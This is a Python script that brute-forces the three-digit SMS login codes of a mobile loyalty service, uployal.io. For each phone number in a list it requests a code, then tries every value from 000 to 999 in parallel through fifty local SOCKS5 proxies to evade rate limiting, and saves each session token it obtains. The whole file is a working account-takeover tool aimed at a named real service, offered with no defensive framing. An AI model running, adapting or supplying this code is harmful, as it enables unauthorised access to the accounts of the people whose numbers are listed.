import asyncio
import random
import socket
import ssl
import time

from aiosocket.async_socket import AIOSocket
from aiosocket.http import read_http_response


class OK(Exception):

    def __init__(self, res, code):
        self.res = res
        self.code = code


HOST = "uployal.io"
ADDR = (socket.gethostbyname(HOST), 443)
SSL_CONTEXT = ssl.create_default_context()


def craft_request(phone_number: str, code: str):
    data = '{"mobile_phone": "' + phone_number + '",  "password": "' + code + '"}'
    content_len = len(data)
    headers = (
            "Host: uployal.io\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: " + str(content_len) + "\r\n"
                                                    "X-APPLICATION-ID: e81d5b756\r\n"
                                                    "User-Agent: okhttp/4.12.0\r\n"
                                                    "\r\n"
    )
    return (
            "POST /api/mobile/v2/consumer/auth/token/ HTTP/1.1\r\n" + headers + data
    ).encode()


def craft_send_code_request(phone: str):
    data = '{"mobile_phone": "' + phone + '"}'
    content_len = len(data)
    headers = (
            "Host: uployal.io\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: " + str(content_len) + "\r\n"
                                                    "X-APPLICATION-ID: e81d5b756\r\n"
                                                    "User-Agent: okhttp/4.12.0\r\n"
                                                    "\r\n"
    )
    return (
            "POST /api/mobile/v2.1/consumer/auth/code/ HTTP/1.1\r\n" + headers + data
    ).encode()


async def send_auth_code(phone: str, proxy):
    async_sock = await AIOSocket.open_connection(
        ADDR, ssl_context=SSL_CONTEXT, server_hostname=HOST, socks5_addr=proxy
    )
    async_sock.set_timeout(10)
    await async_sock.send(craft_send_code_request(phone))
    res = await read_http_response(async_sock)
    return res


async def check_one(phone, code, proxy):
    try:
        async_sock = await AIOSocket.open_connection(
            ADDR, ssl_context=SSL_CONTEXT, server_hostname=HOST, socks5_addr=proxy
        )
        async_sock.set_timeout(50)
        request = craft_request(phone, code)
        await async_sock.send(request)
        response = await read_http_response(async_sock)
        return response
    except Exception as e:
        print("Exception while checking one: " + str(e))
        return await check_one(phone, code, proxy)


async def proxy_checks_codes(phone, proxy, codes):
    for code in codes:
        result = await check_one(phone, code, proxy)
        print(code, result.status_code)
        if result.status_code == 200:
            raise OK(res=result, code=code)
        await asyncio.sleep(1)


async def bruteforce_worker(phone, range_, proxy):
    codes = [f"{code:03d}" for code in range_]
    results = await proxy_checks_codes(phone, proxy, codes)
    return results


async def bruteforce(phone, proxies):
    codes_per_worker = 1000 // len(proxies)
    if codes_per_worker * len(proxies) < 1000:
        raise RuntimeError("Fuck")

    ranges = [
        range(i * codes_per_worker, i * codes_per_worker + codes_per_worker)
        for i in range(len(proxies))
    ]

    requesters = [
        bruteforce_worker(phone, range_, proxy)
        for proxy, range_ in zip(proxies, ranges)
    ]

    try:
        await asyncio.gather(*requesters)
    except OK as e:
        return e.res


def read_numbers():
    with open('numbers.txt', 'r') as f:
        numbers = f.read().split('\n')
        if '' in numbers:
            numbers.remove('')
        return numbers


async def main():
    proxies = [("127.0.0.1", 9053 + i) for i in range(50)]

    for phone in read_numbers():
        try:
            res = await send_auth_code(phone, random.choice(proxies))
            if res.status_code == 200:
                result = await bruteforce(phone, proxies)
                token = result.json()['results']['token']
                print('token', token)
                with open("token.txt", "a") as f:
                    f.write(f'{token}\n')
        except Exception as e:
            print("Error checking number", e)


if __name__ == "__main__":
    asyncio.run(main())
